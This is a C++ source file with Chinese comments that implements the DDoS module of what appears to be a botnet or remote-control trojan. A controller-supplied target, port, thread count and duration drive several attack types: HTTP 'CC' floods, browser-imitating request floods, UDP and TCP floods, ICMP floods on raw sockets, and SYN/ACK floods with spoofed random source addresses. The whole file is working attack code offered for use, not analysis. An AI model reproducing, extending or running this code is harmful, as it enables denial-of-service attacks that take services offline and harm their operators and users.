#include "StdAfx.h"

#include "DDOSManager.h"


//切记不能声明为static...
BOOL Stoping = FALSE;

DWORD DDOSManager::CountTime = 0;

DWORD DDOSManager::ResolvDNS(LPSTR szTarget)
{
	if(szTarget == NULL)
		return FALSE;
	
	DWORD Result = inet_addr(szTarget);
	if(Result!=INADDR_NONE)
		return Result;
	
	hostent Host={0};
	memcpy(&Host,gethostbyname(szTarget),sizeof(hostent));
	
	memcpy(&Result,Host.h_addr,sizeof(DWORD));
	
	return Result;
}

DWORD DDOSManager::CreateRandNum(WORD Min,WORD Max)
{
	SYSTEMTIME st;
	GetLocalTime(&st);
	if(Min==0&&Max==0)
		return GetTickCount()+rand()+st.wMinute+st.wSecond;
	else
		return (GetTickCount()+rand()+st.wMinute+st.wSecond)%((Max-Min)+1)+Min;
}

DWORD WINAPI DDOSManager::CreateTimeer(LPVOID lParam)
{
	DWORD SleepTime=CountTime;
	CountTime =0;

	SleepTime=SleepTime*60*1000;

	DWORD CountTime=0;
	
	while(CountTime<SleepTime)
	{
		if(Stoping==FALSE)
			return 1;

		CountTime+=500;
		Sleep(500);
	}
	Stoping = FALSE;

	ExitThread(0);

	return 0;
}

//获取系统类型 
BOOL GetSystemType()
{
	char windows[128]={NULL};
	ZeroMemory(windows,128);
	
	char SubKeys[MAX_PATH];
	strcpy(SubKeys,"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion");
	HKEY hKeys;
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,SubKeys,0L,KEY_ALL_ACCESS,&hKeys) == ERROR_SUCCESS)
	{
		DWORD dwType;
		DWORD dwSize=200;
		RegQueryValueEx(hKeys,"ProductName",NULL,&dwType,(BYTE *)windows,&dwSize);
		RegCloseKey(hKeys);	
	}
	
	if( strstr(windows,"2000")!=NULL || 
		strstr(windows,"2003")!=NULL ||
		strstr(windows,"2008")!=NULL )
	{
		return TRUE;
	}

	return FALSE;
}


DDOSManager::DDOSManager(LPATTACK PoinParam)
{
	Stoping = TRUE;

	memcpy(&m_Attack,PoinParam,sizeof(ATTACK));
	CountTime = m_Attack.AttackTime;

	CHAR Tip[2000];

	//不等于自定义模式 则发包速度默认为100毫秒 
	if(
		m_Attack.AttackType!=CUSTOM_TCPSEND  && 
		m_Attack.AttackType!=CUSTOM_UDPSEND  &&
		m_Attack.AttackType!=ATTACK_LOOPCC
		)
	{

		m_Attack.ExtendData2 = 100;
		m_Attack.DataSize = strlen(m_Attack.SendData);
	}

	//创建定时器...
	CloseHandle(CreateThread(NULL,NULL,CreateTimeer,&m_Attack.AttackTime,0,NULL));

	int i=0;

	switch(m_Attack.AttackType)
	{
	case ATTACK_CCFLOOD:
		for(i=0;i<m_Attack.AttackThread;i++)
			CloseHandle(CreateThread(NULL,NULL,CCAttack,&m_Attack,0,NULL));
		break;
	case ATTACK_IMITATEIE:
		for(i=0;i<m_Attack.AttackThread;i++)
			 CloseHandle(CreateThread(NULL,NULL,ImitateIERequst,&m_Attack,0,NULL));
		break;
	case ATTACK_LOOPCC:
		for(i=0;i<m_Attack.AttackThread;i++)
			CloseHandle(CreateThread(NULL,NULL,LoopCCAttack,&m_Attack,0,NULL));
		 break;
	case ATTACK_ICMPFLOOD:
		for(i=0;i<m_Attack.AttackThread;i++)
			CloseHandle(CreateThread(NULL,NULL,ICMP_Flood,&m_Attack,0,NULL));
		 break;
	case ATTACK_UDPFLOOD:
		{
			for(i=0;i<m_Attack.AttackThread;i++)
			{	
				//UDP 自定义数据包..
				m_Attack.DataSize = 10;
				ZeroMemory(m_Attack.SendData,sizeof(m_Attack.SendData));
				for(int x=0;x<m_Attack.DataSize;x++)
					m_Attack.SendData[x]=CreateRandNum(1,200);
				CloseHandle(CreateThread(NULL,NULL,UDPAttackModel,&m_Attack,0,NULL));
			}
		}
		break;
	case ATTACK_TCPFLOOD:
		{
			for(i=0;i<m_Attack.AttackThread;i++)
			{
			m_Attack.DataSize = 20;
			ZeroMemory(m_Attack.SendData,sizeof(m_Attack.SendData));
			for(int x=0;x<m_Attack.DataSize;x++)
				m_Attack.SendData[x]=CreateRandNum(1,200);
			CloseHandle(CreateThread(NULL,NULL,CCAttack,&m_Attack,0,NULL));
			}
		}
		break;
	case ATTACK_SYNFLOOD:
		for(i=0;i<m_Attack.AttackThread;i++)
			CloseHandle(CreateThread(NULL,NULL,SYNFlood,&m_Attack,0,NULL));
		break;
	case CUSTOM_TCPSEND:
		{
			for(i=0;i<m_Attack.AttackThread;i++)
				CloseHandle(CreateThread(NULL,NULL,CCAttack,&m_Attack,0,NULL));
		}
		break;
	case CUSTOM_UDPSEND:
		{
			for(i=0;i<m_Attack.AttackThread;i++)
				CloseHandle(CreateThread(NULL,NULL,UDPAttackModel,&m_Attack,0,NULL));
		}	
		break;

	//智能模式 需要进行计算.
	case ATTACK_BRAINPOWER:
		{
			if(GetSystemType())
			{	for(i=0;i<m_Attack.AttackThread;i++)
				{
					CloseHandle(CreateThread(NULL,NULL,ICMP_Flood,&m_Attack,0,NULL));
					CloseHandle(CreateThread(NULL,NULL,SYNFlood,&m_Attack,0,NULL));
					i++;
				}	
			}
			else
			{
				for(i=0;i<m_Attack.AttackThread;i++)
				{
					m_Attack.DataSize = 20;
					ZeroMemory(m_Attack.SendData,sizeof(m_Attack.SendData));
					for(int x=0;x<m_Attack.DataSize;x++)
						m_Attack.SendData[x]=CreateRandNum(1,200);
					CloseHandle(CreateThread(NULL,NULL,CCAttack,&m_Attack,0,NULL));
					CloseHandle(CreateThread(NULL,NULL,UDPAttackModel,&m_Attack,0,NULL));
					i++;
				}
			}
		}
		break;
	default: break;
	}
	Sleep(1000);
}

DWORD WINAPI DDOSManager::CCAttack(LPVOID lParam)
{

	ATTACK m_AttackInfo;
	memcpy(&m_AttackInfo,lParam,sizeof(ATTACK));

	SOCKADDR_IN m_Addr={0};
	ZeroMemory(&m_Addr,sizeof(SOCKADDR_IN));
	int Size = sizeof(SOCKADDR);
	
	m_Addr.sin_family = AF_INET;
	m_Addr.sin_port =htons(m_AttackInfo.AttackPort);
	m_Addr.sin_addr.S_un.S_addr = ResolvDNS(m_AttackInfo.Target);

	SOCKET m_Socket;
	DWORD len = m_AttackInfo.DataSize;
	DWORD SendSize = 0;
	DWORD AllSendSize =0;
	do
	{
		m_Socket= socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

		Sleep(m_AttackInfo.ExtendData2);

		if(connect(m_Socket,(SOCKADDR *)&m_Addr,Size)==SOCKET_ERROR)
			continue;
	
		//发送数据...
		do
		{
			SendSize = send(m_Socket,&m_AttackInfo.SendData[AllSendSize],(int)(len-AllSendSize),0);
			AllSendSize+=SendSize;
		}while(AllSendSize<len);

		closesocket(m_Socket);

		AllSendSize =0;


	}while(Stoping);
	
	ExitThread(0);

	return 0;
}

DWORD WINAPI DDOSManager::LoopCCAttack(LPVOID lParam)
{
	ATTACK m_AttackInfo;
	memcpy(&m_AttackInfo,lParam,sizeof(ATTACK));
	
	CHAR *Point = strstr(m_AttackInfo.SendData,"%d");
	if(Point==NULL)
		return 1;
	//得到首部..
	CHAR szTempHead[1000]={NULL};
	ZeroMemory(szTempHead,1000);
	strncpy(szTempHead,m_AttackInfo.SendData,strlen(m_AttackInfo.SendData)-strlen(Point));

	Point+=2;
	//得到尾部
	CHAR szTempEnd[1000]={NULL};
	strcpy(szTempEnd,Point);

	//缓存Buffer
	CHAR Buffer[2000]={NULL};

	SOCKADDR_IN m_Addr={0};
	ZeroMemory(&m_Addr,sizeof(SOCKADDR_IN));
	int Size = sizeof(SOCKADDR);
	
	m_Addr.sin_family = AF_INET;

	m_Addr.sin_port =htons(m_AttackInfo.AttackPort);

	m_Addr.sin_addr.S_un.S_addr = ResolvDNS(m_AttackInfo.Target);
	
	SOCKET m_Socket;
	DWORD len =strlen(m_AttackInfo.SendData);
	DWORD SendSize = 0;
	DWORD AllSendSize =0;
	DWORD iCount = m_AttackInfo.ExtendData1;
	
	do
	{
		sprintf(m_AttackInfo.SendData,"%s%d%s",szTempHead,m_AttackInfo.ExtendData1,szTempEnd);
		if(m_AttackInfo.ExtendData1++ == m_AttackInfo.ExtendData2)
			m_AttackInfo.ExtendData1 = iCount;

		m_Socket= socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

		if(connect(m_Socket,(SOCKADDR *)&m_Addr,Size)==SOCKET_ERROR)
			continue;

		//发送数据...
		do
		{
			SendSize = send(m_Socket,&m_AttackInfo.SendData[AllSendSize],(int)(len-AllSendSize),0);
			AllSendSize+=SendSize;
		}while(AllSendSize<len);

		closesocket(m_Socket);
		AllSendSize =0;

		Sleep(m_AttackInfo.ExtendData2);

	}while(Stoping);

	ExitThread(0);

	return 0;
}


DWORD WINAPI DDOSManager::ImitateIERequst(LPVOID lParam)
{
	ATTACK m_AttackInfo;
	memcpy(&m_AttackInfo,lParam,sizeof(ATTACK));

	HMODULE hModule=LoadLibrary("WININET.dll");
	typedef BOOL(WINAPI *InternetCloseHandleT)(HINTERNET);
 	InternetCloseHandleT pInternetCloseHandleT=(InternetCloseHandleT)GetProcAddress(hModule,"InternetCloseHandle");

	typedef HINTERNET(WINAPI *InterOpen)(LPCTSTR,DWORD,LPCTSTR,LPCTSTR,DWORD);
 	InterOpen pInterOpen=(InterOpen)GetProcAddress(hModule,"InternetOpenA");

	typedef HINTERNET(WINAPI *OpenUrl)(HINTERNET ,LPCTSTR, LPCTSTR ,DWORD,DWORD,DWORD);
	OpenUrl pOpenUrl=(OpenUrl)GetProcAddress(hModule,"InternetOpenUrlA");
	
	while(Stoping)
	{
		HINTERNET hNet =pInterOpen("User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET4.0C; .NET4.0E)",PRE_CONFIG_INTERNET_ACCESS,NULL,
			INTERNET_INVALID_PORT_NUMBER,0);
		pOpenUrl(hNet,m_AttackInfo.Target, NULL,0, INTERNET_FLAG_RELOAD,0); 

		pInternetCloseHandleT(hNet);

		Sleep(m_AttackInfo.ExtendData2);

	}

	FreeLibrary(hModule);

	ExitThread(0);

	return 0;
}

DWORD WINAPI DDOSManager::UDPAttackModel(LPVOID lParam)
{
	ATTACK m_AttackInfo;
	memcpy(&m_AttackInfo,lParam,sizeof(ATTACK));
	
	SOCKADDR_IN sockAddr={0};
	ZeroMemory(&sockAddr,sizeof(SOCKADDR_IN));
	
	SOCKET	m_hSocket;
	sockAddr.sin_family = AF_INET;

	sockAddr.sin_port=htons(m_AttackInfo.AttackPort);

	sockAddr.sin_addr.S_un.S_addr=ResolvDNS(m_AttackInfo.Target);
	
	WORD Size = m_AttackInfo.DataSize;
	
	WORD StructSize = sizeof(SOCKADDR);
	
	do{

		m_hSocket =socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		
		for(int i=0;i<100;i++)
			sendto(m_hSocket,m_AttackInfo.SendData,(Size-1),0,(SOCKADDR *)&sockAddr,StructSize);

		closesocket(m_hSocket);

		Sleep(m_AttackInfo.ExtendData2);
		
	}while(Stoping);

	ExitThread(0);

	return 0;
}

//CheckSum:计算校验和的子函数 
USHORT checksum(USHORT *buffer,int size)
{
	unsigned long cksum=0;
	while (size>1)
	{
		cksum+=*buffer++;
		size-=sizeof(USHORT);
	}
	if (size)
	{
		cksum+=*(UCHAR*)buffer;
	}
	cksum = (cksum >> 16) + (cksum & 0xffff); 
	cksum += (cksum >>16); 
	return (USHORT)(~cksum);
	
}


void DDOSManager::Fill_ICMP_Data(char *icmp_data, int datasize)
{
	ICMP_HEADER *icmp_hdr;
	char       *datapart;
	icmp_hdr = (ICMP_HEADER*)icmp_data;
	icmp_hdr->i_type = ICMP_ECHO;
	icmp_hdr->i_code = 0;
	icmp_hdr->i_id   = (USHORT)GetCurrentProcessId();
	icmp_hdr->i_cksum = 0;
	icmp_hdr->i_seq = 0;
	
	datapart = icmp_data + sizeof(ICMP_HEADER);
	
	CHAR icmpBuffer[4000]={NULL};
	for (WORD i=0;i<3999;i++)
		icmpBuffer[i]=(CHAR)(CreateRandNum(1,255))%255;
	
	memcpy(datapart,icmpBuffer,strlen(icmpBuffer));
}

DWORD WINAPI DDOSManager::ICMP_Flood(LPVOID lParam)
{
	ATTACK m_AttackInfo;
	memcpy(&m_AttackInfo,lParam,sizeof(ATTACK));

	SOCKET m_hSocket;
	SOCKADDR_IN m_addrDest;
	char              *icmp_data;
	int   datasize = 32;
	int timeout = 2000;
	
	m_hSocket = WSASocket (AF_INET, SOCK_RAW, IPPROTO_ICMP, NULL, 0,WSA_FLAG_OVERLAPPED);

	if (m_hSocket == INVALID_SOCKET) 
	{
		ExitThread(0);

		return 0;
	}
	if (setsockopt(m_hSocket, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout)) == SOCKET_ERROR) 
	{
		ExitThread(0);

		return 0;
	}

	memset(&m_addrDest, 0, sizeof(m_addrDest));
	
	m_addrDest.sin_family = AF_INET;
	m_addrDest.sin_addr.S_un.S_addr=ResolvDNS(m_AttackInfo.Target);

	datasize += sizeof(ICMP_HEADER);  

	icmp_data =(char*) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,MAX_PACKET);
	
	memset(icmp_data,0,MAX_PACKET);
	
	Fill_ICMP_Data(icmp_data,MAX_PACKET);
	
	int seq_no=0;

	while(Stoping)
	{
		Sleep(m_AttackInfo.ExtendData2);
		((ICMP_HEADER*)icmp_data)->i_cksum = 0;
		((ICMP_HEADER*)icmp_data)->i_seq =	seq_no++;

		((ICMP_HEADER*)icmp_data)->timestamp = GetTickCount();

		((ICMP_HEADER*)icmp_data)->i_cksum = checksum((USHORT*)icmp_data, MAX_PACKET);

		sendto(m_hSocket, icmp_data, MAX_PACKET, 0, (struct sockaddr*)&m_addrDest, sizeof(m_addrDest)); 
		
		if (seq_no>=65534)
			seq_no=1;
	}
	ExitThread(0);

	return 0;
}

DWORD WINAPI DDOSManager::SYNFlood(LPVOID lParam)
{	

	ATTACK m_AttackInfo;
	memcpy(&m_AttackInfo,lParam,sizeof(ATTACK));

    SOCKET             sendSocket; 
    SOCKADDR_IN        Sin; 
    IP_HEADER          ipHeader;
    TCP_HEADER         tcpHeader; 
    PSD_HEADER         psdHeader; 
    char               szSendBuf[128] = ""; 
	
    if((sendSocket = WSASocket(AF_INET, SOCK_RAW, IPPROTO_RAW, NULL,
		0, WSA_FLAG_OVERLAPPED)) == INVALID_SOCKET) 
	{
		ExitThread(0);

		return 0; 
	}
	BOOL               flag=1; 
    if(setsockopt(sendSocket, IPPROTO_IP, IP_HDRINCL, 
		(char *)&flag, sizeof(flag)) == SOCKET_ERROR) 
	{
		ExitThread(0);

		return 0;
	}
	int timeout = 3000; 
	
    if(setsockopt(sendSocket, SOL_SOCKET, SO_SNDTIMEO,
		(char *)&timeout, sizeof(timeout)) == SOCKET_ERROR) 
	{
		ExitThread(0);
		
		return 0;
	}
	
	Sin.sin_family = AF_INET; 
	Sin.sin_port=htons(m_AttackInfo.AttackPort); 
	Sin.sin_addr.S_un.S_addr=ResolvDNS(m_AttackInfo.Target); 
	
	char         src_ip[20] = {0};
	
	while(Stoping)
    {
		int i = CreateRandNum(1,254);
		Sleep(m_AttackInfo.ExtendData2);
		sprintf( src_ip, "%d.%d.%d.%d ",i%230+1,i%220+1, i%252+1, i%253+1); 

		//填充IP首部 
		ipHeader.h_verlen = (4<<4 | sizeof(ipHeader)/sizeof(unsigned long)); 
		ipHeader.tos = 0; 
		ipHeader.total_len = htons(sizeof(ipHeader)+sizeof(tcpHeader)); 
		ipHeader.ident = 1; 
		ipHeader.frag_and_flags = 0x40; 
		ipHeader.ttl = 128; 
		ipHeader.proto = IPPROTO_TCP; 
		ipHeader.checksum = 0; 
		ipHeader.sourceIP = inet_addr(src_ip); 
		ipHeader.destIP = Sin.sin_addr.s_addr; 
		
		//填充TCP首部 
		tcpHeader.th_sport = htons(rand()%1025); //源端口号 
		tcpHeader.th_dport = htons(80); //目标端口号 
		tcpHeader.th_seq = htonl( rand()%900000000 + 1 ); 
		tcpHeader.th_ack=rand()%3;
		if (rand()%2 == 0) tcpHeader.th_flag=0x02;//SYN
		else tcpHeader.th_flag=0x10;//ACK
		tcpHeader.th_lenres = (sizeof(tcpHeader)/4<<4|0); 
		tcpHeader.th_win = htons(512); 
		tcpHeader.th_sum = 0; 
		tcpHeader.th_urp = 0; 
		
		psdHeader.saddr = ipHeader.sourceIP; 
		psdHeader.daddr = ipHeader.destIP; 
		psdHeader.mbz = 0; 
		psdHeader.ptcl = IPPROTO_TCP; 
		psdHeader.tcpl = htons(sizeof(tcpHeader)); 
		
		//计算TCP校验和 
		memcpy( szSendBuf, &psdHeader, sizeof(psdHeader) ); 
		memcpy( szSendBuf + sizeof(psdHeader), &tcpHeader, sizeof(tcpHeader) ); 
		tcpHeader.th_sum = checksum( (USHORT *) szSendBuf, sizeof(psdHeader) + sizeof(tcpHeader) ); 
		
		//计算IP检验和 
		memcpy( szSendBuf, &ipHeader, sizeof(ipHeader) ); 
		memcpy( szSendBuf + sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader) ); 
		memset( szSendBuf + sizeof(ipHeader) + sizeof(tcpHeader), 0, 4 ); 
		ipHeader.checksum = checksum( (USHORT *) szSendBuf, sizeof(ipHeader) + sizeof(tcpHeader) ); 
		
		memcpy( szSendBuf, &ipHeader, sizeof(ipHeader) ); 
		memcpy( szSendBuf+sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader) ); 
		
		for(int a=0;a<100;a++)
			sendto(sendSocket, szSendBuf, sizeof(ipHeader) + sizeof(tcpHeader), 0, (struct sockaddr*)&Sin, sizeof(Sin)); 
	}
	closesocket(sendSocket);
	
	ExitThread(0);

    return 0;
}
